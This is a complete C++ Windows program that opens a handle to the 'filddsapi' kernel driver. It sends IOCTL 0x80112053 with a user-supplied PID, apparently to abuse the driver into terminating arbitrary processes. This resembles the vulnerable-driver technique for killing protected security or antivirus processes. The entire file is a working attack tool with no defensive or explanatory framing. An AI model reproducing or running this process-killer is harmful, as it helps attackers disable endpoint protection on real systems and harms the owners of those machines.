#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\filddsapi"

HANDLE hDevice;

struct DATA_0x80112053
{
    unsigned int pid;
    unsigned char padding[4];
    unsigned int status;
};

void TerminateProcess_0x80112053()
{
    DWORD dwWrite;
    DATA_0x80112053 data;
    scanf_s("%d", &data.pid);
    DeviceIoControl(hDevice, 0x80112053, &data, sizeof(data), &data, sizeof(data), &dwWrite, NULL);
}

int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %llx\n", GetLastError());
        system("pause");
        return 0;
    }

    TerminateProcess_0x80112053();

    system("pause");
    return 0;
}
